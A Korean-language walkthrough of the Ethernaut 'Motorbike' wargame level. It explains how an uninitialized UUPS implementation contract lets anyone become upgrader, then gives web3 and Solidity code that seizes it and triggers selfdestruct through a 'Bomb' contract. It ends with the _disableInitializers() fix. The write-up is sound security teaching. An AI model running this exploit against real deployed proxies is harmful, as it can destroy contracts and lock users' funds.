# Ethernaut Level 25 - Motorbike

## 문제 설명

UUPS 프록시의 구현 컨트랙트(Engine)를 `selfdestruct`로 파괴하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Engine is Initializable {
    address public upgrader;
    uint256 public horsePower;

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    function upgradeToAndCall(address newImplementation, bytes memory data)
        external payable
    {
        require(msg.sender == upgrader, "Can't upgrade");
        _upgradeToAndCall(newImplementation, data);
    }

    function _upgradeToAndCall(address newImplementation, bytes memory data)
        internal
    {
        _upgradeTo(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
}
```

---

## 취약점 분석

### 구현 컨트랙트 미초기화

프록시(Motorbike)는 `initialize()`를 호출해 초기화되어 있지만,
구현 컨트랙트(Engine) **자체는 직접 초기화되지 않았다**.

→ 누구나 Engine에서 `initialize()`를 직접 호출해 `upgrader`가 될 수 있음

→ `upgrader`가 된 후 `selfdestruct`를 포함한 악성 컨트랙트로 업그레이드

→ Engine 파괴 → 프록시 작동 불능

---

## 공격 단계

### Step 1 — Engine 주소 확인

EIP-1967 구현 슬롯에서 읽기:

```js
let engineAddress = await web3.eth.getStorageAt(
    contract.address,
    "0x360894a13ba1a3210667c828492db98dca3e2076635130c1000000000000000"
)
// 앞의 0 패딩 제거
engineAddress = "0x" + engineAddress.slice(-40)
```

### Step 2 — Engine 직접 초기화

```js
const engineABI = [
    {"name": "initialize", "type": "function", "inputs": [], "outputs": []},
    {"name": "upgradeToAndCall", "type": "function",
     "inputs": [{"name": "newImplementation","type": "address"},
                {"name": "data","type": "bytes"}], "outputs": []}
]
const engine = new web3.eth.Contract(engineABI, engineAddress)
await engine.methods.initialize().send({from: player})
// → upgrader = player
```

### Step 3 — 폭탄 컨트랙트 배포

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Bomb {
    function explode() public {
        selfdestruct(payable(msg.sender));
    }
}
```

### Step 4 — Engine을 Bomb으로 업그레이드 후 실행

```js
let bombAddress = "Bomb 컨트랙트 주소"
let data = web3.eth.abi.encodeFunctionSignature("explode()")
await engine.methods.upgradeToAndCall(bombAddress, data).send({from: player})
// → Engine selfdestruct 실행
```

---

## 핵심 교훈

- UUPS 프록시에서 구현 컨트랙트는 반드시 **직접 초기화 방지** 필요
- OpenZeppelin `_disableInitializers()` 생성자 호출 권장

```solidity
// ✅ 안전한 구현
constructor() {
    _disableInitializers();
}
```

- 프록시 패턴 사용 시 구현 컨트랙트의 독립 보안도 반드시 고려해야 함
